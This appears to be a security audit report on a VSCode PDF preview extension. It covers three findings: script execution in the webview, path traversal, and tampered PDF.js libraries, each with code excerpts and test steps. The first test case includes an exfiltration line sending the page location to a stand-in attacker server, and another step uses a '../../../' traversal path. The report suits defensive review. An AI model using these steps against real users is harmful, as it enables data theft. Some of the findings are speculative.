# PDF Extension Security Vulnerabilities

## 1. Remote Code Execution (RCE) via Unsafe PDF Content Loading

### Vulnerability Name
Remote Code Execution (RCE) via Unsafe PDF Content Loading

### Description
The extension loads PDF files from the user's workspace into a webview that has JavaScript enabled. When loading a PDF file, it's displayed through PDF.js without proper sanitization or isolation of potentially malicious content within the PDF. A malicious PDF could contain JavaScript code that gets executed in the context of the webview.

A threat actor can create a repository containing a specially crafted PDF file that, when opened by a victim using this extension, could execute arbitrary code within the webview's context.

### Impact
The attacker can execute JavaScript code within the context of the VSCode webview, potentially allowing:
- Access to local file system via the webview's APIs
- Communication with the extension's message handlers
- Exfiltration of sensitive information from the victim's environment
- Further exploitation of VSCode's extension API

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension does implement a Content Security Policy (CSP) in the webview:
```javascript
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; connect-src ${cspSource}; script-src 'unsafe-inline' ${cspSource}; style-src 'unsafe-inline' ${cspSource}; img-src blob: data: ${cspSource};">
```

However, this CSP still allows 'unsafe-inline' scripts, which can be problematic when displaying potentially malicious content.

### Missing Mitigations
1. The extension should use a stricter Content Security Policy that doesn't include 'unsafe-inline' for script-src.
2. PDF content should be properly sanitized before rendering.
3. The extension should implement a sandbox mechanism to isolate PDF execution from the rest of the webview context.

### Preconditions
1. The victim must have the PDF extension installed in VSCode.
2. The victim must open a malicious PDF file from a repository they've accessed.

### Source Code Analysis
In `pdfPreview.ts`, the extension creates a webview with scripts enabled and renders the PDF content directly:

```typescript
webviewEditor.webview.options = {
  enableScripts: true,
  localResourceRoots: [resourceRoot, extensionRoot],
};
```

The PDF content is loaded directly from the file path provided:
```typescript
const settings = {
  cMapUrl: resolveAsUri('lib', 'web', 'cmaps/').toString(),
  path: docPath.toString(),
  // ...
};
```

The webview is given direct access to the PDF file through:
```typescript
const docPath = webview.asWebviewUri(this.resource);
```

This allows any JavaScript embedded in the PDF to potentially execute within the webview's context. The PDF.js library does have some protections against malicious JavaScript within PDFs, but it's not foolproof against sophisticated attacks, especially with 'unsafe-inline' scripts allowed in the CSP.

### Security Test Case
1. Create a malicious PDF file containing embedded JavaScript that attempts to execute code in the webview context
2. The JavaScript could attempt to:
   ```javascript
   fetch('https://attacker-server.com/exfil?' + document.location.href);
   ```
3. Place this PDF in a GitHub repository
4. Convince the victim to open the repository with VSCode
5. When the victim opens the PDF file with the extension, the malicious JavaScript executes in the webview context
6. Verify that the malicious code executed by checking for the exfiltrated data on the attacker's server

## 2. Path Traversal via PDF Resource Loading

### Vulnerability Name
Path Traversal Through PDF Resource Loading

### Description
When loading PDF files, the extension allows the webview to access files from the same directory as the PDF through `localResourceRoots`. This could allow a carefully crafted malicious PDF to access unintended files in the workspace through path traversal techniques.

### Impact
An attacker who tricks a victim into opening a malicious PDF could potentially:
- Access sensitive files from other parts of the workspace
- Execute code by loading malicious JavaScript files from other locations in the workspace
- Bypass intended security boundaries within the editor

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension attempts to restrict resource access with:
```typescript
const resourceRoot = resource.with({
  path: resource.path.replace(/\/[^/]+?\.\w+$/, '/'),
});

webviewEditor.webview.options = {
  enableScripts: true,
  localResourceRoots: [resourceRoot, extensionRoot],
};
```

### Missing Mitigations
1. Stricter validation of resource paths being loaded
2. More restrictive localResourceRoots setting that prevents directory traversal
3. Proper sanitization of URLs and paths used within the PDF renderer

### Preconditions
1. The victim must open a malicious PDF that contains crafted references to resources outside its intended directory

### Source Code Analysis
In `pdfPreview.ts`, the extension sets up the webview with:
```typescript
const resourceRoot = resource.with({
  path: resource.path.replace(/\/[^/]+?\.\w+$/, '/'),
});

webviewEditor.webview.options = {
  enableScripts: true,
  localResourceRoots: [resourceRoot, extensionRoot],
};
```

The `resourceRoot` is determined by removing the filename from the path of the PDF file. This means any file in the same directory as the PDF can be accessed by the webview. If a PDF contains references to resources using path traversal (e.g., `../../../sensitive-file`), it might be able to load resources outside the intended directory if VSCode's webview implementation doesn't properly restrict such accesses.

Additionally, resources are passed directly to the webview without sanitization:
```typescript
const docPath = webview.asWebviewUri(this.resource);
```

### Security Test Case
1. Create a PDF file with embedded references to resources using path traversal techniques:
   ```
   ../../../other-directory/malicious.js
   ```
2. Create a malicious JavaScript file at the target location
3. Place these files in a GitHub repository with the structure that enables the traversal
4. Have the victim open the PDF file with the extension
5. Verify if the PDF can load resources from outside its directory through the path traversal

## 3. Supply Chain Code Injection via Manipulated PDF.js Libraries

### Vulnerability Name
Supply Chain Code Injection via Manipulated PDF.js Libraries

### Description
A threat actor can craft a malicious repository that contains altered versions of the PDF.js libraries (e.g. modified files in the "lib" folder such as `pdf.js`, `viewer.js`, or `main.js`). The published instructions (in README) explicitly instruct users to "overwrite ./lib/* by extracted directories" when upgrading PDF.js. When a victim installs or updates the extension using the manipulated repository, the extension's webview will load and execute these malicious (attacker‚Äêcontrolled) scripts. Once executed in the trusted context of VS Code's webview (which has JavaScript enabled), the malicious code could perform arbitrary operations or communicate with other parts of VS Code and the local system.

### Impact
- **Remote Code Execution (RCE):** The malicious scripts run inside VS Code's webview can execute arbitrary JavaScript code with access to the extension's privileges.
- **Privilege Escalation:** Abusing the extension's trusted context may allow command execution via VS Code APIs, read sensitive workspace data, or modify local files.
- **Supply Chain Compromise:** The integrity of the PDF preview feature is undermined because the extension blindly loads local libraries from its repository without checking their authenticity.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- The webview HTML (constructed in `pdfPreview.ts`) is built using a Content Security Policy (CSP) that restricts network connections and limits resource origins.
- The webview is configured to load local resources only from paths that are under the extension root (using `localResourceRoots`).
- However, these mitigations do not help when the entire repository source (including the "lib" folder) is maliciously altered.

### Missing Mitigations
- **Integrity Verification:** No cryptographic integrity checks (code signing or hash verification) are performed on the library files loaded from the "lib" folder.
- **Sandboxing for Webview Scripts:** The webview does not isolate externally loaded scripts (which are marked as "unsafe-inline" in the CSP) from the extension's privileged context.
- **Update Process Hardening:** No measures exist to verify that the upgraded libraries match trusted versions provided by the official PDF.js release.

### Preconditions
- The victim installs or upgrades the extension from a repository whose contents have been manipulated by an attacker.
- The extension's README instructions are followed (overwriting the "lib" folder with contents from the repository), thereby introducing malicious script files.
- The webview is enabled with full script execution (as set by `enableScripts: true`) and configured to trust all files within the extension folder.

### Source Code Analysis
In `extension.ts`, the extension sets the extension root with:
```typescript
const extensionRoot = vscode.Uri.file(context.extensionPath);
```
and later passes this to the custom PDF provider.

In `pdfPreview.ts`, the function `getWebviewContents()` constructs the webview's HTML page. It calls a helper function `resolveAsUri(...)` that simply uses `path.join` with the extension root to build URIs. For example:
```typescript
<script src="${resolveAsUri('lib', 'build', 'pdf.js')}"></script>
<script src="${resolveAsUri('lib', 'web', 'viewer.js')}"></script>
<script src="${resolveAsUri('lib', 'main.js')}"></script>
```

If the repository has been manipulated, the "lib" folder may contain attacker-supplied JavaScript code. Because the webview is created with `enableScripts: true` and its local resource roots are set to include the extension folder, these malicious scripts are loaded and executed without further integrity checks.

Although a CSP is enforced, it only restricts network origins; the CSP still allows inline execution (via the use of `'unsafe-inline'` in the script-src directive) and does nothing to validate the origin of the loaded local files.

### Security Test Case
1. Create a manipulated version of the repository. In this version, modify one or more of the PDF.js library files in the "lib" folder (for example, insert a payload into `lib/main.js` that logs a message to the console or triggers an alert‚Äîthis stands in for malicious code that would attempt RCE).
2. Follow the upgrade instructions in the README to overwrite the existing "lib" folder with the manipulated content.
3. Launch VS Code with the extension installed.
4. Open a PDF file so that the PDF preview is activated.
5. Observe that the manipulated `lib/main.js` (or other altered file) is loaded by the webview and that the payload executes (for example, by confirming that the injected alert or console message appears).
6. (Optional) Attempt to use additional commands or API calls from the malicious script to prove that arbitrary code execution is possible within the extension's privileged context.
